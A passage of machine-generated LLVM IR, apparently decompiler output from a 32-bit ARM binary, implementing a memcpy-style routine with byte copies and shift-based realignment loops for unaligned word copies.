bb137:                                            ; preds = %.thread120
  %v5_123c8 = load i32, i32* @r1, align 4
  %v6_123c8 = inttoptr i32 %v5_123c8 to i8*
  %v7_123c8 = load i8, i8* %v6_123c8, align 1
  %v8_123c8 = zext i8 %v7_123c8 to i32
  store i32 %v8_123c8, i32* %r3.global-to-local, align 4
  %v10_123c8 = add i32 %v5_123c8, 1
  store i32 %v10_123c8, i32* @r1, align 4
  %v8_123cc = inttoptr i32 %v7_123cc to i8*
  store i8 %v7_123c8, i8* %v8_123cc, align 1
  %v9_123cc = load i32, i32* %r0.global-to-local, align 4
  %v10_123cc = add i32 %v9_123cc, 1
  store i32 %v10_123cc, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_123d0 = load i8*, i8** %stack_var_-8, align 4
  %v3_123d0 = ptrtoint i8* %v2_123d0 to i32
  store i32 %v3_123d0, i32* %r0.global-to-local, align 4
  ret i32 %v3_123d0

dec_label_pc_123d4:                               ; preds = %dec_label_pc_12328
  %v1_123d4 = sub nsw i32 4, %v1_12328
  store i32 %v1_123d4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_123d8 = icmp ult i32 %v1_123d4, 2
  store i1 %v8_123d8, i1* %cpsr_n.global-to-local, align 1
  %v1_123dc = inttoptr i32 %v0_12310 to i8*
  %v2_123dc = load i8, i8* %v1_123dc, align 1
  %v3_123dc = zext i8 %v2_123dc to i32
  store i32 %v3_123dc, i32* %r3.global-to-local, align 4
  %v5_123dc = add i32 %v0_12310, 1
  store i32 %v5_123dc, i32* @r1, align 4
  store i8 %v2_123dc, i8* %v5_1231c, align 1
  %v4_123e0 = load i32, i32* %r0.global-to-local, align 4
  %v5_123e0 = add i32 %v4_123e0, 1
  store i32 %v5_123e0, i32* %r0.global-to-local, align 4
  br i1 %v8_123d8, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_123d4
  %v9_123d8 = icmp eq i32 %v1_123d4, 2
  %v6_123e4 = load i32, i32* @r1, align 4
  %v7_123e4 = inttoptr i32 %v6_123e4 to i8*
  %v8_123e4 = load i8, i8* %v7_123e4, align 1
  %v9_123e4 = zext i8 %v8_123e4 to i32
  store i32 %v9_123e4, i32* %r3.global-to-local, align 4
  %v11_123e4 = add i32 %v6_123e4, 1
  store i32 %v11_123e4, i32* @r1, align 4
  %v9_123e8 = inttoptr i32 %v5_123e0 to i8*
  store i8 %v8_123e4, i8* %v9_123e8, align 1
  %v10_123e8 = load i32, i32* %r0.global-to-local, align 4
  %v11_123e8 = add i32 %v10_123e8, 1
  store i32 %v11_123e8, i32* %r0.global-to-local, align 4
  br i1 %v9_123d8, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_123ec = load i32, i32* @r1, align 4
  %v9_123ec = inttoptr i32 %v8_123ec to i8*
  %v10_123ec = load i8, i8* %v9_123ec, align 1
  %v11_123ec = zext i8 %v10_123ec to i32
  store i32 %v11_123ec, i32* %r3.global-to-local, align 4
  %v13_123ec = add i32 %v8_123ec, 1
  store i32 %v13_123ec, i32* @r1, align 4
  %v11_123f0 = inttoptr i32 %v11_123e8 to i8*
  store i8 %v10_123ec, i8* %v11_123f0, align 1
  %v12_123f0 = load i32, i32* %r0.global-to-local, align 4
  %v13_123f0 = add i32 %v12_123f0, 1
  store i32 %v13_123f0, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_123d4, %bb139
  %v0_1244c76 = phi i32 [ %v11_123e8, %bb138 ], [ %v5_123e0, %dec_label_pc_123d4 ], [ %v13_123f0, %bb139 ]
  %v0_123f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_123f4 = load i32, i32* @ip, align 4
  %v2_123f4 = sub i32 %v0_123f4, %v1_123f4
  store i32 %v2_123f4, i32* %r2.global-to-local, align 4
  %v4_123f4 = xor i32 %v1_123f4, %v0_123f4
  %v5_123f4 = xor i32 %v2_123f4, %v0_123f4
  %v6_123f4 = and i32 %v5_123f4, %v4_123f4
  %v7_123f4 = icmp slt i32 %v6_123f4, 0
  store i1 %v7_123f4, i1* %cpsr_v.global-to-local, align 1
  %v8_123f4 = icmp slt i32 %v2_123f4, 0
  store i1 %v8_123f4, i1* %cpsr_n.global-to-local, align 1
  %v5_123f8 = icmp slt i32 %v0_123f4, %v1_123f4
  br i1 %v5_123f8, label %bb133, label %dec_label_pc_123fc

dec_label_pc_123fc:                               ; preds = %.thread12
  %v0_123fc = load i32, i32* @r1, align 4
  %v1_123fc = urem i32 %v0_123fc, 4
  store i32 %v1_123fc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_123fc = icmp eq i32 %v1_123fc, 0
  %extract.t124 = trunc i32 %v0_123fc to i2
  br i1 %v2_123fc, label %dec_label_pc_12338, label %dec_label_pc_12404

dec_label_pc_12404:                               ; preds = %dec_label_pc_12330, %dec_label_pc_123fc
  %v0_1244c75 = phi i32 [ %v1_12310, %dec_label_pc_12330 ], [ %v0_1244c76, %dec_label_pc_123fc ]
  %v0_124f8 = phi i32 [ %v2_12320, %dec_label_pc_12330 ], [ %v2_123f4, %dec_label_pc_123fc ]
  %v0_1240c.off0 = phi i2 [ %extract.t, %dec_label_pc_12330 ], [ %extract.t124, %dec_label_pc_123fc ]
  %v0_12404 = phi i32 [ %v0_12310, %dec_label_pc_12330 ], [ %v0_123fc, %dec_label_pc_123fc ]
  %v1_12404 = and i32 %v0_12404, -4
  store i32 %v1_12404, i32* %r1.global-to-local, align 4
  %v1_12408 = inttoptr i32 %v1_12404 to i32*
  %v2_12408 = load i32, i32* %v1_12408, align 4
  store i32 %v2_12408, i32* @lr, align 4
  %v4_12408 = add i32 %v1_12404, 4
  store i32 %v4_12408, i32* %r1.global-to-local, align 4
  %v2_124f0 = add i32 %v0_124f8, -12
  %v4_124f0 = sub i32 11, %v0_124f8
  %v5_124f0 = and i32 %v4_124f0, %v0_124f8
  %v6_124f0 = icmp slt i32 %v5_124f0, 0
  store i1 %v6_124f0, i1* %cpsr_v.global-to-local, align 1
  %v7_124f0 = icmp slt i32 %v2_124f0, 0
  store i1 %v7_124f0, i1* %cpsr_n.global-to-local, align 1
  %v5_124f4 = icmp slt i32 %v0_124f8, 12
  switch i2 %v0_1240c.off0, label %dec_label_pc_12418 [
    i2 -1, label %dec_label_pc_124f0
    i2 -2, label %dec_label_pc_12484
  ]

dec_label_pc_12418:                               ; preds = %dec_label_pc_12404
  br i1 %v5_124f4, label %dec_label_pc_12464, label %dec_label_pc_12420

dec_label_pc_12420:                               ; preds = %dec_label_pc_12418
  store i32 %v2_124f0, i32* %r2.global-to-local, align 4
  %v3_12424 = load i32, i32* @r4, align 4
  store i32 %v3_12424, i32* %stack_var_-16, align 4
  %v6_12424 = load i32, i32* @r5, align 4
  store i32 %v6_12424, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12428

dec_label_pc_12428:                               ; preds = %dec_label_pc_12428.dec_label_pc_12428_crit_edge, %dec_label_pc_12420
  %v0_1244c = phi i32 [ %v12_1244c, %dec_label_pc_12428.dec_label_pc_12428_crit_edge ], [ %v0_1244c75, %dec_label_pc_12420 ]
  %v0_1242c = phi i32 [ %v0_1242c.pre, %dec_label_pc_12428.dec_label_pc_12428_crit_edge ], [ %v4_12408, %dec_label_pc_12420 ]
  %v0_12428 = phi i32 [ %v0_12428.pre, %dec_label_pc_12428.dec_label_pc_12428_crit_edge ], [ %v2_12408, %dec_label_pc_12420 ]
  %v3_12428 = udiv i32 %v0_12428, 256
  store i32 %v3_12428, i32* %r3.global-to-local, align 4
  %v1_1242c = inttoptr i32 %v0_1242c to i32*
  %v2_1242c = load i32, i32* %v1_1242c, align 4
  store i32 %v2_1242c, i32* %r4.global-to-local, align 4
  %v3_1242c = add i32 %v0_1242c, 4
  %v4_1242c = inttoptr i32 %v3_1242c to i32*
  %v5_1242c = load i32, i32* %v4_1242c, align 4
  store i32 %v5_1242c, i32* %r5.global-to-local, align 4
  %v6_1242c = add i32 %v0_1242c, 8
  %v7_1242c = inttoptr i32 %v6_1242c to i32*
  %v8_1242c = load i32, i32* %v7_1242c, align 4
  store i32 %v8_1242c, i32* %ip.global-to-local, align 4
  %v9_1242c = add i32 %v0_1242c, 12
  %v10_1242c = inttoptr i32 %v9_1242c to i32*
  %v11_1242c = load i32, i32* %v10_1242c, align 4
  store i32 %v11_1242c, i32* @lr, align 4
  %v12_1242c = add i32 %v0_1242c, 16
  store i32 %v12_1242c, i32* %r1.global-to-local, align 4
  %v4_12430 = mul i32 %v2_1242c, 16777216
  %v5_12430 = or i32 %v4_12430, %v3_12428
  store i32 %v5_12430, i32* %r3.global-to-local, align 4
  %v3_12434 = udiv i32 %v2_1242c, 256
  %v4_12438 = mul i32 %v5_1242c, 16777216
  %v5_12438 = or i32 %v4_12438, %v3_12434
  store i32 %v5_12438, i32* %r4.global-to-local, align 4
  %v3_1243c = udiv i32 %v5_1242c, 256
  %v4_12440 = mul i32 %v8_1242c, 16777216
  %v5_12440 = or i32 %v4_12440, %v3_1243c
  store i32 %v5_12440, i32* %r5.global-to-local, align 4
  %v3_12444 = udiv i32 %v8_1242c, 256
  %v4_12448 = mul i32 %v11_1242c, 16777216
  %v5_12448 = or i32 %v4_12448, %v3_12444
  store i32 %v5_12448, i32* @ip, align 4
  %v1_1244c = inttoptr i32 %v0_1244c to i32*
  store i32 %v5_12430, i32* %v1_1244c, align 4
  %v3_1244c = add i32 %v0_1244c, 4
  %v4_1244c = inttoptr i32 %v3_1244c to i32*
  %v5_1244c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1244c, i32* %v4_1244c, align 4
  %v6_1244c = add i32 %v0_1244c, 8
  %v7_1244c = inttoptr i32 %v6_1244c to i32*
  %v8_1244c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1244c, i32* %v7_1244c, align 4
  %v9_1244c = add i32 %v0_1244c, 12
  %v10_1244c = inttoptr i32 %v9_1244c to i32*
  %v11_1244c = load i32, i32* @ip, align 4
  store i32 %v11_1244c, i32* %v10_1244c, align 4
  %v12_1244c = add i32 %v0_1244c, 16
  store i32 %v12_1244c, i32* %r0.global-to-local, align 4
  %v0_12450 = load i32, i32* %r2.global-to-local, align 4
  %v2_12450 = add i32 %v0_12450, -16
  store i32 %v2_12450, i32* %r2.global-to-local, align 4
  %v6_12454 = icmp slt i32 %v0_12450, 16
  br i1 %v6_12454, label %dec_label_pc_12458, label %dec_label_pc_12428.dec_label_pc_12428_crit_edge

dec_label_pc_12428.dec_label_pc_12428_crit_edge:  ; preds = %dec_label_pc_12428
  %v0_12428.pre = load i32, i32* @lr, align 4
  %v0_1242c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12428

dec_label_pc_12458:                               ; preds = %dec_label_pc_12428
  %v2_12458 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12458, i32* @r4, align 4
  %v5_12458 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_12458, i32* @r5, align 4
  %v2_1245c = add i32 %v0_12450, -4
  store i32 %v2_1245c, i32* %r2.global-to-local, align 4
  %v4_1245c = add i32 %v0_12450, 2147483632
  %v5_1245c = and i32 %v2_1245c, %v4_1245c
  %v6_1245c = icmp slt i32 %v5_1245c, 0
  store i1 %v6_1245c, i1* %cpsr_v.global-to-local, align 1
  %v7_1245c = icmp slt i32 %v2_1245c, 0
  store i1 %v7_1245c, i1* %cpsr_n.global-to-local, align 1
  %v5_12460 = icmp slt i32 %v2_12450, -12
  br i1 %v5_12460, label %dec_label_pc_1247c, label %dec_label_pc_12464

dec_label_pc_12464:                               ; preds = %dec_label_pc_12458, %dec_label_pc_12418, %dec_label_pc_12464
  %v1_12470 = phi i32 [ %v4_12470, %dec_label_pc_12464 ], [ %v12_1244c, %dec_label_pc_12458 ], [ %v0_1244c75, %dec_label_pc_12418 ]
  %v0_12464 = load i32, i32* @lr, align 4
  %v3_12464 = udiv i32 %v0_12464, 256
  store i32 %v3_12464, i32* %ip.global-to-local, align 4
  %v0_12468 = load i32, i32* %r1.global-to-local, align 4
  %v1_12468 = inttoptr i32 %v0_12468 to i32*
  %v2_12468 = load i32, i32* %v1_12468, align 4
  store i32 %v2_12468, i32* @lr, align 4
  %v4_12468 = add i32 %v0_12468, 4
  store i32 %v4_12468, i32* %r1.global-to-local, align 4
  %v4_1246c = mul i32 %v2_12468, 16777216
  %v5_1246c = or i32 %v4_1246c, %v3_12464
  store i32 %v5_1246c, i32* @ip, align 4
  %v2_12470 = inttoptr i32 %v1_12470 to i32*
  store i32 %v5_1246c, i32* %v2_12470, align 4
  %v3_12470 = load i32, i32* %r0.global-to-local, align 4
  %v4_12470 = add i32 %v3_12470, 4
  store i32 %v4_12470, i32* %r0.global-to-local, align 4
  %v0_12474 = load i32, i32* %r2.global-to-local, align 4
  %v2_12474 = add i32 %v0_12474, -4
  store i32 %v2_12474, i32* %r2.global-to-local, align 4
  %v6_12478 = icmp slt i32 %v0_12474, 4
  br i1 %v6_12478, label %dec_label_pc_1247c.loopexit, label %dec_label_pc_12464

dec_label_pc_1247c.loopexit:                      ; preds = %dec_label_pc_12464
  %v4_12474 = sub i32 3, %v0_12474
  %v5_12474 = and i32 %v4_12474, %v0_12474
  %v6_12474 = icmp slt i32 %v5_12474, 0
  %v7_12474 = icmp slt i32 %v2_12474, 0
  store i1 %v6_12474, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12474, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1247c

dec_label_pc_1247c:                               ; preds = %dec_label_pc_1247c.loopexit, %dec_label_pc_12458
  %v2_123bc113 = phi i32 [ %v4_12470, %dec_label_pc_1247c.loopexit ], [ %v12_1244c, %dec_label_pc_12458 ]
  %v0_123ac109 = phi i32 [ %v2_12474, %dec_label_pc_1247c.loopexit ], [ %v2_1245c, %dec_label_pc_12458 ]
  %v0_1247c = load i32, i32* %r1.global-to-local, align 4
  %v1_1247c = add i32 %v0_1247c, -3
  store i32 %v1_1247c, i32* @r1, align 4
  br label %bb133

dec_label_pc_12484:                               ; preds = %dec_label_pc_12404
  br i1 %v5_124f4, label %dec_label_pc_124d0, label %dec_label_pc_1248c

dec_label_pc_1248c:                               ; preds = %dec_label_pc_12484
  store i32 %v2_124f0, i32* %r2.global-to-local, align 4
  %v3_12490 = load i32, i32* @r4, align 4
  store i32 %v3_12490, i32* %stack_var_-16, align 4
  %v6_12490 = load i32, i32* @r5, align 4
  store i32 %v6_12490, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12494

dec_label_pc_12494:                               ; preds = %dec_label_pc_12494.dec_label_pc_12494_crit_edge, %dec_label_pc_1248c
  %v0_124b8 = phi i32 [ %v12_124b8, %dec_label_pc_12494.dec_label_pc_12494_crit_edge ], [ %v0_1244c75, %dec_label_pc_1248c ]
  %v0_12498 = phi i32 [ %v0_12498.pre, %dec_label_pc_12494.dec_label_pc_12494_crit_edge ], [ %v4_12408, %dec_label_pc_1248c ]
  %v0_12494 = phi i32 [ %v0_12494.pre, %dec_label_pc_12494.dec_label_pc_12494_crit_edge ], [ %v2_12408, %dec_label_pc_1248c ]
  %v3_12494 = udiv i32 %v0_12494, 65536
  store i32 %v3_12494, i32* %r3.global-to-local, align 4
  %v1_12498 = inttoptr i32 %v0_12498 to i32*
  %v2_12498 = load i32, i32* %v1_12498, align 4
  store i32 %v2_12498, i32* %r4.global-to-local, align 4
  %v3_12498 = add i32 %v0_12498, 4
  %v4_12498 = inttoptr i32 %v3_12498 to i32*
  %v5_12498 = load i32, i32* %v4_12498, align 4
  store i32 %v5_12498, i32* %r5.global-to-local, align 4
  %v6_12498 = add i32 %v0_12498, 8
  %v7_12498 = inttoptr i32 %v6_12498 to i32*
  %v8_12498 = load i32, i32* %v7_12498, align 4
  store i32 %v8_12498, i32* %ip.global-to-local, align 4
  %v9_12498 = add i32 %v0_12498, 12
  %v10_12498 = inttoptr i32 %v9_12498 to i32*
  %v11_12498 = load i32, i32* %v10_12498, align 4
  store i32 %v11_12498, i32* @lr, align 4
  %v12_12498 = add i32 %v0_12498, 16
  store i32 %v12_12498, i32* %r1.global-to-local, align 4
  %v4_1249c = mul i32 %v2_12498, 65536
  %v5_1249c = or i32 %v4_1249c, %v3_12494
  store i32 %v5_1249c, i32* %r3.global-to-local, align 4
  %v3_124a0 = udiv i32 %v2_12498, 65536
  %v4_124a4 = mul i32 %v5_12498, 65536
  %v5_124a4 = or i32 %v4_124a4, %v3_124a0
  store i32 %v5_124a4, i32* %r4.global-to-local, align 4
  %v3_124a8 = udiv i32 %v5_12498, 65536
  %v4_124ac = mul i32 %v8_12498, 65536
  %v5_124ac = or i32 %v4_124ac, %v3_124a8
  store i32 %v5_124ac, i32* %r5.global-to-local, align 4
  %v3_124b0 = udiv i32 %v8_12498, 65536
  %v4_124b4 = mul i32 %v11_12498, 65536
  %v5_124b4 = or i32 %v4_124b4, %v3_124b0
  store i32 %v5_124b4, i32* @ip, align 4
  %v1_124b8 = inttoptr i32 %v0_124b8 to i32*
  store i32 %v5_1249c, i32* %v1_124b8, align 4
  %v3_124b8 = add i32 %v0_124b8, 4
  %v4_124b8 = inttoptr i32 %v3_124b8 to i32*
  %v5_124b8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_124b8, i32* %v4_124b8, align 4
  %v6_124b8 = add i32 %v0_124b8, 8
  %v7_124b8 = inttoptr i32 %v6_124b8 to i32*
  %v8_124b8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_124b8, i32* %v7_124b8, align 4
  %v9_124b8 = add i32 %v0_124b8, 12
  %v10_124b8 = inttoptr i32 %v9_124b8 to i32*
  %v11_124b8 = load i32, i32* @ip, align 4
  store i32 %v11_124b8, i32* %v10_124b8, align 4
  %v12_124b8 = add i32 %v0_124b8, 16
  store i32 %v12_124b8, i32* %r0.global-to-local, align 4
  %v0_124bc = load i32, i32* %r2.global-to-local, align 4
  %v2_124bc = add i32 %v0_124bc, -16
  store i32 %v2_124bc, i32* %r2.global-to-local, align 4
  %v6_124c0 = icmp slt i32 %v0_124bc, 16
  br i1 %v6_124c0, label %dec_label_pc_124c4, label %dec_label_pc_12494.dec_label_pc_12494_crit_edge

dec_label_pc_12494.dec_label_pc_12494_crit_edge:  ; preds = %dec_label_pc_12494
  %v0_12494.pre = load i32, i32* @lr, align 4
  %v0_12498.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12494

dec_label_pc_124c4:                               ; preds = %dec_label_pc_12494
  %v2_124c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_124c4, i32* @r4, align 4
  %v5_124c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_124c4, i32* @r5, align 4
  %v2_124c8 = add i32 %v0_124bc, -4
  store i32 %v2_124c8, i32* %r2.global-to-local, align 4
  %v4_124c8 = add i32 %v0_124bc, 2147483632
  %v5_124c8 = and i32 %v2_124c8, %v4_124c8
  %v6_124c8 = icmp slt i32 %v5_124c8, 0
  store i1 %v6_124c8, i1* %cpsr_v.global-to-local, align 1
  %v7_124c8 = icmp slt i32 %v2_124c8, 0
  store i1 %v7_124c8, i1* %cpsr_n.global-to-local, align 1
  %v5_124cc = icmp slt i32 %v2_124bc, -12
  br i1 %v5_124cc, label %dec_label_pc_124e8, label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %dec_label_pc_124c4, %dec_label_pc_12484, %dec_label_pc_124d0
  %v1_124dc = phi i32 [ %v4_124dc, %dec_label_pc_124d0 ], [ %v12_124b8, %dec_label_pc_124c4 ], [ %v0_1244c75, %dec_label_pc_12484 ]
  %v0_124d0 = load i32, i32* @lr, align 4
  %v3_124d0 = udiv i32 %v0_124d0, 65536
  store i32 %v3_124d0, i32* %ip.global-to-local, align 4
  %v0_124d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_124d4 = inttoptr i32 %v0_124d4 to i32*
  %v2_124d4 = load i32, i32* %v1_124d4, align 4
  store i32 %v2_124d4, i32* @lr, align 4
  %v4_124d4 = add i32 %v0_124d4, 4
  store i32 %v4_124d4, i32* %r1.global-to-local, align 4
  %v4_124d8 = mul i32 %v2_124d4, 65536
  %v5_124d8 = or i32 %v4_124d8, %v3_124d0
  store i32 %v5_124d8, i32* @ip, align 4
  %v2_124dc = inttoptr i32 %v1_124dc to i32*
  store i32 %v5_124d8, i32* %v2_124dc, align 4
  %v3_124dc = load i32, i32* %r0.global-to-local, align 4
  %v4_124dc = add i32 %v3_124dc, 4
  store i32 %v4_124dc, i32* %r0.global-to-local, align 4
  %v0_124e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_124e0 = add i32 %v0_124e0, -4
  store i32 %v2_124e0, i32* %r2.global-to-local, align 4
  %v6_124e4 = icmp slt i32 %v0_124e0, 4
  br i1 %v6_124e4, label %dec_label_pc_124e8.loopexit, label %dec_label_pc_124d0

dec_label_pc_124e8.loopexit:                      ; preds = %dec_label_pc_124d0
  %v4_124e0 = sub i32 3, %v0_124e0
  %v5_124e0 = and i32 %v4_124e0, %v0_124e0
  %v6_124e0 = icmp slt i32 %v5_124e0, 0
  %v7_124e0 = icmp slt i32 %v2_124e0, 0
  store i1 %v6_124e0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_124e0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_124e8

dec_label_pc_124e8:                               ; preds = %dec_label_pc_124e8.loopexit, %dec_label_pc_124c4
  %v2_123bc114 = phi i32 [ %v4_124dc, %dec_label_pc_124e8.loopexit ], [ %v12_124b8, %dec_label_pc_124c4 ]
  %v0_123ac110 = phi i32 [ %v2_124e0, %dec_label_pc_124e8.loopexit ], [ %v2_124c8, %dec_label_pc_124c4 ]
  %v0_124e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_124e8 = add i32 %v0_124e8, -2
  store i32 %v1_124e8, i32* @r1, align 4
  br label %bb133

dec_label_pc_124f0:                               ; preds = %dec_label_pc_12404
  br i1 %v5_124f4, label %dec_label_pc_1253c, label %dec_label_pc_124f8

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124f0
  store i32 %v2_124f0, i32* %r2.global-to-local, align 4
  %v3_124fc = load i32, i32* @r4, align 4
  store i32 %v3_124fc, i32* %stack_var_-16, align 4
  %v6_124fc = load i32, i32* @r5, align 4
  store i32 %v6_124fc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %dec_label_pc_12500.dec_label_pc_12500_crit_edge, %dec_label_pc_124f8
  %v0_12524 = phi i32 [ %v12_12524, %dec_label_pc_12500.dec_label_pc_12500_crit_edge ], [ %v0_1244c75, %dec_label_pc_124f8 ]
  %v0_12504 = phi i32 [ %v0_12504.pre, %dec_label_pc_12500.dec_label_pc_12500_crit_edge ], [ %v4_12408, %dec_label_pc_124f8 ]
  %v0_12500 = phi i32 [ %v0_12500.pre, %dec_label_pc_12500.dec_label_pc_12500_crit_edge ], [ %v2_12408, %dec_label_pc_124f8 ]
  %v3_12500 = udiv i32 %v0_12500, 16777216
  store i32 %v3_12500, i32* %r3.global-to-local, align 4
  %v1_12504 = inttoptr i32 %v0_12504 to i32*
  %v2_12504 = load i32, i32* %v1_12504, align 4
  store i32 %v2_12504, i32* %r4.global-to-local, align 4
  %v3_12504 = add i32 %v0_12504, 4
  %v4_12504 = inttoptr i32 %v3_12504 to i32*
  %v5_12504 = load i32, i32* %v4_12504, align 4
  store i32 %v5_12504, i32* %r5.global-to-local, align 4
  %v6_12504 = add i32 %v0_12504, 8
  %v7_12504 = inttoptr i32 %v6_12504 to i32*
  %v8_12504 = load i32, i32* %v7_12504, align 4
  store i32 %v8_12504, i32* %ip.global-to-local, align 4
  %v9_12504 = add i32 %v0_12504, 12
  %v10_12504 = inttoptr i32 %v9_12504 to i32*
  %v11_12504 = load i32, i32* %v10_12504, align 4
  store i32 %v11_12504, i32* @lr, align 4
  %v12_12504 = add i32 %v0_12504, 16
  store i32 %v12_12504, i32* %r1.global-to-local, align 4
  %v4_12508 = mul i32 %v2_12504, 256
  %v5_12508 = or i32 %v4_12508, %v3_12500
  store i32 %v5_12508, i32* %r3.global-to-local, align 4
  %v3_1250c = udiv i32 %v2_12504, 16777216
  %v4_12510 = mul i32 %v5_12504, 256
  %v5_12510 = or i32 %v4_12510, %v3_1250c
  store i32 %v5_12510, i32* %r4.global-to-local, align 4
  %v3_12514 = udiv i32 %v5_12504, 16777216
  %v4_12518 = mul i32 %v8_12504, 256
  %v5_12518 = or i32 %v4_12518, %v3_12514
  store i32 %v5_12518, i32* %r5.global-to-local, align 4
  %v3_1251c = udiv i32 %v8_12504, 16777216
  %v4_12520 = mul i32 %v11_12504, 256
  %v5_12520 = or i32 %v4_12520, %v3_1251c
  store i32 %v5_12520, i32* @ip, align 4
  %v1_12524 = inttoptr i32 %v0_12524 to i32*
  store i32 %v5_12508, i32* %v1_12524, align 4
  %v3_12524 = add i32 %v0_12524, 4
  %v4_12524 = inttoptr i32 %v3_12524 to i32*
  %v5_12524 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_12524, i32* %v4_12524, align 4
  %v6_12524 = add i32 %v0_12524, 8
  %v7_12524 = inttoptr i32 %v6_12524 to i32*
  %v8_12524 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_12524, i32* %v7_12524, align 4
  %v9_12524 = add i32 %v0_12524, 12
  %v10_12524 = inttoptr i32 %v9_12524 to i32*
  %v11_12524 = load i32, i32* @ip, align 4
  store i32 %v11_12524, i32* %v10_12524, align 4
  %v12_12524 = add i32 %v0_12524, 16
  store i32 %v12_12524, i32* %r0.global-to-local, align 4
  %v0_12528 = load i32, i32* %r2.global-to-local, align 4
  %v2_12528 = add i32 %v0_12528, -16
  store i32 %v2_12528, i32* %r2.global-to-local, align 4
  %v6_1252c = icmp slt i32 %v0_12528, 16
  br i1 %v6_1252c, label %dec_label_pc_12530, label %dec_label_pc_12500.dec_label_pc_12500_crit_edge

dec_label_pc_12500.dec_label_pc_12500_crit_edge:  ; preds = %dec_label_pc_12500
  %v0_12500.pre = load i32, i32* @lr, align 4
  %v0_12504.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12500

dec_label_pc_12530:                               ; preds = %dec_label_pc_12500
  %v2_12530 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12530, i32* @r4, align 4
  %v5_12530 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_12530, i32* @r5, align 4
  %v2_12534 = add i32 %v0_12528, -4
  store i32 %v2_12534, i32* %r2.global-to-local, align 4
  %v4_12534 = add i32 %v0_12528, 2147483632
  %v5_12534 = and i32 %v2_12534, %v4_12534
  %v6_12534 = icmp slt i32 %v5_12534, 0
  store i1 %v6_12534, i1* %cpsr_v.global-to-local, align 1
  %v7_12534 = icmp slt i32 %v2_12534, 0
  store i1 %v7_12534, i1* %cpsr_n.global-to-local, align 1
  %v5_12538 = icmp slt i32 %v2_12528, -12
  br i1 %v5_12538, label %dec_label_pc_12554, label %dec_label_pc_1253c

dec_label_pc_1253c:                               ; preds = %dec_label_pc_124f0, %dec_label_pc_12530, %dec_label_pc_1253c
  %v1_12548 = phi i32 [ %v4_12548, %dec_label_pc_1253c ], [ %v0_1244c75, %dec_label_pc_124f0 ], [ %v12_12524, %dec_label_pc_12530 ]
  %v0_1253c = load i32, i32* @lr, align 4
  %v3_1253c = udiv i32 %v0_1253c, 16777216
  store i32 %v3_1253c, i32* %ip.global-to-local, align 4
  %v0_12540 = load i32, i32* %r1.global-to-local, align 4
  %v1_12540 = inttoptr i32 %v0_12540 to i32*
  %v2_12540 = load i32, i32* %v1_12540, align 4
  store i32 %v2_12540, i32* @lr, align 4
  %v4_12540 = add i32 %v0_12540, 4
  store i32 %v4_12540, i32* %r1.global-to-local, align 4
  %v4_12544 = mul i32 %v2_12540, 256
  %v5_12544 = or i32 %v4_12544, %v3_1253c
  store i32 %v5_12544, i32* @ip, align 4
  %v2_12548 = inttoptr i32 %v1_12548 to i32*
  store i32 %v5_12544, i32* %v2_12548, align 4
  %v3_12548 = load i32, i32* %r0.global-to-local, align 4
  %v4_12548 = add i32 %v3_12548, 4
  store i32 %v4_12548, i32* %r0.global-to-local, align 4
  %v0_1254c = load i32, i32* %r2.global-to-local, align 4
  %v2_1254c = add i32 %v0_1254c, -4
  store i32 %v2_1254c, i32* %r2.global-to-local, align 4
  %v6_12550 = icmp slt i32 %v0_1254c, 4
  br i1 %v6_12550, label %dec_label_pc_12554.loopexit, label %dec_label_pc_1253c

dec_label_pc_12554.loopexit:                      ; preds = %dec_label_pc_1253c
  %v4_1254c = sub i32 3, %v0_1254c
  %v5_1254c = and i32 %v4_1254c, %v0_1254c
  %v6_1254c = icmp slt i32 %v5_1254c, 0
  %v7_1254c = icmp slt i32 %v2_1254c, 0
  store i1 %v6_1254c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1254c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12554

dec_label_pc_12554:                               ; preds = %dec_label_pc_12554.loopexit, %dec_label_pc_12530
  %v2_123bc112 = phi i32 [ %v4_12548, %dec_label_pc_12554.loopexit ], [ %v12_12524, %dec_label_pc_12530 ]
  %v0_123ac108 = phi i32 [ %v2_1254c, %dec_label_pc_12554.loopexit ], [ %v2_12534, %dec_label_pc_12530 ]
  %v0_12554 = load i32, i32* %r1.global-to-local, align 4
  %v1_12554 = add i32 %v0_12554, -1
  store i32 %v1_12554, i32* @r1, align 4
  br label %bb133

dec_label_pc_1255c:                               ; preds = %dec_label_pc_12310
  %v1_1255c = load i32, i32* @r2, align 4
